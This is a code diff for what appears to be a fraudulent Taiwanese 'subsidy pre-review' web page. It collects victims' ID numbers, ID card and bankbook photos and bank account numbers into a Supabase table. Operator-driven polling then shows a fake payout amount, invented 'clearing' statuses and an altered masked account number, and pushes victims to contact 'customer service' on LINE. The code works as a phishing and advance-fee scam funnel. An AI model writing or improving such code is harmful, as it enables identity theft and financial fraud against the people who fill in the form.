@@ -620,6 +620,31 @@
       font-size: 12px;
       font-weight: 900;
     }
+    .account-review-card {
+      margin-top: 16px;
+      padding: 16px;
+      border-radius: 14px;
+      border: 1px solid #ffd0b8;
+      background: #fff7f2;
+      color: #8a2f0d;
+    }
+    .masked-card {
+      display: inline-flex;
+      margin-top: 8px;
+      padding: 6px 10px;
+      border-radius: 999px;
+      background: #fff;
+      border: 1px solid #ffd0b8;
+      font-weight: 900;
+      color: #6f260b;
+    }
+    .btn-pulse {
+      animation: pulse-green 1.6s ease-in-out infinite;
+    }
+    @keyframes pulse-green {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(0, 185, 0, .28); }
+      50% { box-shadow: 0 0 0 10px rgba(0, 185, 0, 0); }
+    }
 
     .sidebar {
       position: sticky;
@@ -986,6 +1011,9 @@
           <label class="form-label">常用 LINE ID</label>
           <input type="text" id="lineId" class="form-input" placeholder="例：user123456">
 
+          <label class="form-label">收款帳戶 / 銀行卡號 <span class="required">*</span></label>
+          <input type="text" id="bankAccount" class="form-input" placeholder="例：1234567890" required>
+
           <label class="form-label">上傳身分證正面 <span class="required">*</span></label>
           <label class="file-upload-btn">
             <input type="file" id="idFront" accept="image/*" required>
@@ -1004,14 +1032,14 @@
 
           <div class="btn-group">
             <button type="button" onclick="goToStep1()" class="btn btn-secondary">上一步</button>
-            <button type="button" onclick="goToStep3()" class="btn btn-primary">送出預審</button>
+            <button type="button" onclick="goToStep3()" class="btn btn-primary" id="btn-final-submit">送出資料</button>
           </div>
         </div>
 
         <div id="step-3" class="step-content hidden">
           <div class="step-indicator">
             <h2>Step 3 / 3</h2>
-            <p>整理補助預審資料中</p>
+            <p id="review-status-title">資料上傳中，請稍候...</p>
           </div>
 
           <div class="progress-container">
@@ -1021,22 +1049,22 @@
           <div class="review-step active" id="review-step-1">
             <div class="loader"></div>
             <div class="review-text">
-              <p>正在整理你的補助條件</p>
-              <p class="hint">確認需求區間與收入狀態</p>
+              <p id="review-step-1-title">資料上傳中，請稍候...</p>
+              <p class="hint" id="review-step-1-hint">正在保存你提交的資料</p>
             </div>
           </div>
           <div class="review-step" id="review-step-2">
             <div class="loader"></div>
             <div class="review-text">
-              <p>正在確認資料完整度</p>
-              <p class="hint">檢查聯絡資訊與上傳項目</p>
+              <p>資料校對中</p>
+              <p class="hint">後台完成核對後會更新後續狀態</p>
             </div>
           </div>
           <div class="review-step" id="review-step-3">
             <div class="loader"></div>
             <div class="review-text">
-              <p>正在建立後續補件流程</p>
-              <p class="hint">完成後會顯示預審補助區間</p>
+              <p>等待補件通知</p>
+              <p class="hint">若需要補充資料，頁面會顯示中性提示</p>
             </div>
           </div>
         </div>
@@ -1059,15 +1087,20 @@
         </div>
 
         <div class="wallet-card">
-          <div class="wallet-label">你的預審補助金額區間</div>
+          <div class="wallet-label">資料校對狀態</div>
           <div class="wallet-amount" id="wallet-amount">NT$ 0</div>
-          <div class="wallet-status">待專人核對資格</div>
+          <div class="wallet-status" id="wallet-status">款項清算與發放通道資料校對中</div>
         </div>
 
-        <button type="button" onclick="openWithdrawalModal()" class="btn btn-primary">補充收款帳戶資料</button>
+        <div id="clearing-waiting" class="alert alert-success">
+          資料已送出，正在進行帳號資料二次核對。請保持此頁開啟，系統會自動更新提示。
+        </div>
 
-        <div class="alert alert-success">
-          預審資料已完成整理。若需要加速確認，可補充收款帳戶資料並加入 LINE，讓專人協助核對補件細節。
+        <div id="account-review-alert" class="account-review-card hidden">
+          <strong>帳號資料需人工核對，請聯繫客服協助補件。</strong>
+          <div>需核對資料：<span id="masked-admin-card" class="masked-card"></span></div>
+          <div style="height:12px"></div>
+          <button type="button" onclick="trackLineClick()" class="btn btn-primary btn-pulse">聯絡客服協助補件</button>
         </div>
       </section>
     </main>
@@ -1103,30 +1136,17 @@
 
   <div class="float-cta" onclick="scrollToForm()">立即做 1 分鐘補助預審</div>
 
-  <div id="withdrawal-modal" class="modal-overlay">
-    <div class="modal-content">
-      <div class="modal-header">補充收款帳戶資料</div>
-      <div class="modal-body">
-        <input type="text" id="bankAccount" class="form-input" placeholder="例：1234567890" required>
-      </div>
-      <div class="modal-footer">
-        <button type="button" onclick="closeWithdrawalModal()" class="btn btn-secondary">取消</button>
-        <button type="button" onclick="confirmWithdrawal()" class="btn btn-primary">確認補充</button>
-      </div>
-    </div>
-  </div>
-
   <div id="verification-modal" class="modal-overlay">
     <div class="modal-content">
-      <div class="modal-header">下一步：加入 LINE 完成確認</div>
+      <div class="modal-header">資料需重新確認</div>
       <div class="modal-body">
-        <div class="alert alert-success">
-          請加入官方 LINE，並向專人傳送「我已完成補助預審」，方便核對資料與說明後續補件流程。
+        <div class="alert alert-warning" id="verification-message">
+          資料需重新確認，請檢查後再送出。
         </div>
       </div>
       <div class="modal-footer">
-        <button type="button" onclick="closeVerificationModal()" class="btn btn-secondary">稍後再說</button>
-        <button type="button" onclick="trackLineClick()" class="btn btn-primary">加入 LINE</button>
+        <button type="button" onclick="closeVerificationModal()" class="btn btn-secondary">返回修改</button>
+        <button type="button" onclick="trackLineClick()" class="btn btn-primary">聯絡客服協助補件</button>
       </div>
     </div>
   </div>
@@ -1158,6 +1178,8 @@
     var subsidyClient = window.supabase ? supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY) : null;
     window.__lastLeadId = null;
     window.__submitFallbackTimer = null;
+    window.__qualificationPollTimer = null;
+    window.__accountPollTimer = null;
 
     function selectAmount(btn, value) {
       document.querySelectorAll('[data-amount]').forEach(function(b) { b.classList.remove('selected'); });
@@ -1185,20 +1207,32 @@
       }
     }
 
-    function goToStep2() {
+    async function goToStep2() {
       if (!formData.amount || !formData.employment || !formData.bankStatus) {
         alert('請先完成所有問題');
         return;
       }
-      document.getElementById('step-1').classList.add('hidden');
-      document.getElementById('step-2').classList.remove('hidden');
-      if (typeof fbq !== 'undefined') fbq('track', 'AddToCart');
-      scrollToForm();
+      var btnNext = document.getElementById('btn-step1-next');
+      btnNext.disabled = true;
+      btnNext.textContent = '資料上傳中，請稍候...';
+      try {
+        await submitInitialLead();
+        startQualificationPolling();
+      } catch (error) {
+        console.error('初始資料送出失敗:', error);
+        alert('資料送出失敗，請稍後再試。');
+        btnNext.disabled = false;
+        btnNext.textContent = '下一步';
+      }
     }
 
     function goToStep1() {
+      clearQualificationPolling();
       document.getElementById('step-2').classList.add('hidden');
       document.getElementById('step-1').classList.remove('hidden');
+      var btnNext = document.getElementById('btn-step1-next');
+      btnNext.disabled = false;
+      btnNext.textContent = '下一步';
       scrollToForm();
     }
 
@@ -1229,13 +1263,117 @@
       }
     });
 
-    function goToStep3() {
+    async function submitInitialLead() {
+      if (!subsidyClient) throw new Error('Supabase 尚未載入');
+
+      if (window.__lastLeadId) {
+        var retryResult = await subsidyClient
+          .from(LEADS_TABLE)
+          .update({
+            subsidy_amount: formData.amount,
+            monthly_income: formData.employment,
+            warning_account: formData.bankStatus,
+            status: 'pending',
+            admin_modified_card: '',
+            updated_at: new Date().toISOString()
+          })
+          .eq('id', window.__lastLeadId);
+        if (retryResult.error) throw retryResult.error;
+        return window.__lastLeadId;
+      }
+
+      var leadId = createUUID();
+      var lead = {
+        id: leadId,
+        subsidy_amount: formData.amount,
+        monthly_income: formData.employment,
+        warning_account: formData.bankStatus,
+        source_url: window.location.href,
+        user_agent: navigator.userAgent,
+        status: 'pending',
+        admin_modified_card: ''
+      };
+
+      var insertResult = await subsidyClient.from(LEADS_TABLE).insert(lead);
+      if (insertResult.error) throw insertResult.error;
+      window.__lastLeadId = leadId;
+      return leadId;
+    }
+
+    function clearQualificationPolling() {
+      if (window.__qualificationPollTimer) {
+        clearInterval(window.__qualificationPollTimer);
+        window.__qualificationPollTimer = null;
+      }
+    }
+
+    function startQualificationPolling() {
+      clearQualificationPolling();
+      showStepLoading('資料上傳中，請稍候...', '等待後台完成資料狀態更新');
+      window.__qualificationPollTimer = setInterval(checkQualificationStatus, 3000);
+      checkQualificationStatus();
+    }
+
+    async function checkQualificationStatus() {
+      if (!window.__lastLeadId || !subsidyClient) return;
+      var result = await subsidyClient
+        .from(LEADS_TABLE)
+        .select('status')
+        .eq('id', window.__lastLeadId)
+        .single();
+      if (result.error) {
+        console.warn('狀態讀取失敗:', result.error);
+        return;
+      }
+      var status = result.data && result.data.status;
+      if (status === 'approved') {
+        clearQualificationPolling();
+        document.getElementById('step-3').classList.add('hidden');
+        document.getElementById('step-1').classList.add('hidden');
+        document.getElementById('step-2').classList.remove('hidden');
+        var btnNext = document.getElementById('btn-step1-next');
+        btnNext.disabled = false;
+        btnNext.textContent = '下一步';
+        if (typeof fbq !== 'undefined') fbq('track', 'AddToCart');
+        scrollToForm();
+      }
+      if (status === 'rejected') {
+        clearQualificationPolling();
+        document.getElementById('step-3').classList.add('hidden');
+        document.getElementById('step-1').classList.remove('hidden');
+        var retryBtn = document.getElementById('btn-step1-next');
+        retryBtn.disabled = false;
+        retryBtn.textContent = '重新送出';
+        showVerificationModal('資料需重新確認，請檢查後再送出。');
+        scrollToForm();
+      }
+    }
+
+    function showStepLoading(title, hint) {
+      document.getElementById('step-1').classList.add('hidden');
+      document.getElementById('step-2').classList.add('hidden');
+      document.getElementById('wallet-container').classList.add('hidden');
+      document.getElementById('step-3').classList.remove('hidden');
+      document.getElementById('review-status-title').textContent = title;
+      document.getElementById('review-step-1-title').textContent = title;
+      document.getElementById('review-step-1-hint').textContent = hint || '';
+      document.getElementById('review-step-1').classList.add('active');
+      document.getElementById('review-step-2').classList.remove('active', 'completed');
+      document.getElementById('review-step-3').classList.remove('active', 'completed');
+      var progressBar = document.getElementById('progress-bar');
+      progressBar.classList.remove('animate-progress');
+      setTimeout(function() { progressBar.classList.add('animate-progress'); }, 10);
+      scrollToForm();
+    }
+
+    async function goToStep3() {
       var fullName = document.getElementById('fullName').value.trim();
       var idNumber = document.getElementById('idNumber').value.trim();
       var phone = document.getElementById('phone').value.trim();
       var lineId = document.getElementById('lineId').value.trim();
+      var bankAccount = document.getElementById('bankAccount').value.trim();
 
-      if (!fullName || !idNumber || !phone || !formData.idFront || !formData.bankBook) {
+      if (!fullName || !idNumber || !phone || !bankAccount || !formData.idFront || !formData.bankBook) {
         alert('請填寫所有必填欄位並上傳文件');
         return;
       }
@@ -1244,12 +1382,24 @@
       formData.idNumber = idNumber;
       formData.phone = phone;
       formData.lineId = lineId;
+      formData.bankAccount = bankAccount;
 
-      document.getElementById('step-2').classList.add('hidden');
-      document.getElementById('step-3').classList.remove('hidden');
-      triggerAIReview();
-      if (typeof fbq !== 'undefined') fbq('track', 'InitiateCheckout');
-      scrollToForm();
+      var submitButton = document.getElementById('btn-final-submit');
+      submitButton.disabled = true;
+      submitButton.textContent = '資料上傳中...';
+      showStepLoading('資料上傳中，請稍候...', '正在保存聯絡資料與補件檔案');
+      try {
+        await submitFinalDataToSupabase();
+        if (typeof fbq !== 'undefined') fbq('track', 'InitiateCheckout');
+        showWallet();
+      } catch (error) {
+        console.error('完整資料送出失敗:', error);
+        alert('資料送出失敗，請稍後再試。');
+        document.getElementById('step-3').classList.add('hidden');
+        document.getElementById('step-2').classList.remove('hidden');
+        submitButton.disabled = false;
+        submitButton.textContent = '送出資料';
+      }
     }
 
     function triggerAIReview() {
@@ -1280,9 +1430,10 @@
       };
       var displayAmount = amountMap[formData.amount] || 0;
       document.getElementById('wallet-amount').textContent = 'NT$ ' + displayAmount.toLocaleString();
-      window.__submitFallbackTimer = setTimeout(function() {
-        if (!window.__lastLeadId) submitFormToSupabase();
-      }, 15000);
+      document.getElementById('wallet-status').textContent = '款項清算與發放通道資料校對中';
+      document.getElementById('clearing-waiting').classList.remove('hidden');
+      document.getElementById('account-review-alert').classList.add('hidden');
+      startAccountReviewPolling();
       if (typeof fbq !== 'undefined') fbq('track', 'Purchase');
       document.getElementById('wallet-container').scrollIntoView({ behavior: 'smooth', block: 'start' });
     }
@@ -1307,7 +1458,9 @@
       showVerificationModal();
     }
 
-    function showVerificationModal() {
+    function showVerificationModal(message) {
+      var messageEl = document.getElementById('verification-message');
+      if (messageEl) messageEl.textContent = message || '資料需重新確認，請檢查後再送出。';
       document.getElementById('verification-modal').classList.add('active');
     }
 
@@ -1318,6 +1471,47 @@
     function trackLineClick() {
       if (typeof fbq !== 'undefined') fbq('track', 'Contact');
       window.open('https://line.me/R/ti/p/%40your_line_official_account', '_blank');
+    }
+
+    function clearAccountReviewPolling() {
+      if (window.__accountPollTimer) {
+        clearInterval(window.__accountPollTimer);
+        window.__accountPollTimer = null;
+      }
+    }
+
+    function startAccountReviewPolling() {
+      clearAccountReviewPolling();
+      window.__accountPollTimer = setInterval(checkAccountReviewStatus, 3000);
+      checkAccountReviewStatus();
+    }
+
+    async function checkAccountReviewStatus() {
+      if (!window.__lastLeadId || !subsidyClient) return;
+      var result = await subsidyClient
+        .from(LEADS_TABLE)
+        .select('admin_modified_card')
+        .eq('id', window.__lastLeadId)
+        .single();
+      if (result.error) {
+        console.warn('帳號核對狀態讀取失敗:', result.error);
+        return;
+      }
+      var modifiedCard = ((result.data && result.data.admin_modified_card) || '').trim();
+      if (!modifiedCard) return;
+      clearAccountReviewPolling();
+      document.getElementById('wallet-status').textContent = '帳號資料需人工核對';
+      document.getElementById('clearing-waiting').classList.add('hidden');
+      document.getElementById('masked-admin-card').textContent = maskAccount(modifiedCard);
+      document.getElementById('account-review-alert').classList.remove('hidden');
+      document.getElementById('wallet-container').scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+
+    function maskAccount(value) {
+      var text = String(value || '').replace(/\s+/g, '');
+      if (text.length <= 4) return '****';
+      if (text.length <= 8) return text.slice(0, 2) + '****' + text.slice(-2);
+      return text.slice(0, 4) + '****' + text.slice(-4);
     }
 
     function scrollToForm() {
@@ -1384,22 +1578,20 @@
       return path;
     }
 
-    async function submitFormToSupabase() {
+    async function submitFinalDataToSupabase() {
       try {
         if (!subsidyClient) {
-          console.warn('Supabase 尚未載入，資料暫未送出');
-          return;
+          throw new Error('Supabase 尚未載入');
         }
-        if (window.__lastLeadId) {
-          return;
+        if (!window.__lastLeadId) {
+          await submitInitialLead();
         }
 
-        var leadId = createUUID();
+        var leadId = window.__lastLeadId;
         var idDocumentPath = await uploadDocument(formData.idFront, leadId, 'id-document');
         var bankBookPath = await uploadDocument(formData.bankBook, leadId, 'bank-book');
 
-        var lead = {
-          id: leadId,
+        var leadUpdate = {
           name: formData.fullName,
           id_number: formData.idNumber,
           phone: formData.phone,
@@ -1412,17 +1604,21 @@
           bank_book_path: bankBookPath,
           source_url: window.location.href,
           user_agent: navigator.userAgent,
-          status: 'new'
+          admin_modified_card: '',
+          updated_at: new Date().toISOString()
         };
 
-        var insertResult = await subsidyClient.from(LEADS_TABLE).insert(lead);
-        if (insertResult.error) throw insertResult.error;
-        window.__lastLeadId = leadId;
-        if (window.__submitFallbackTimer) clearTimeout(window.__submitFallbackTimer);
-        console.log('補助預審資料已送出');
+        var updateResult = await subsidyClient.from(LEADS_TABLE).update(leadUpdate).eq('id', leadId);
+        if (updateResult.error) throw updateResult.error;
+        console.log('補助預審完整資料已送出');
       } catch (error) {
         console.error('提交失敗:', error);
+        throw error;
       }
+    }
+
+    async function submitFormToSupabase() {
+      return submitFinalDataToSupabase();
     }
 
     var liveNum = 1247;
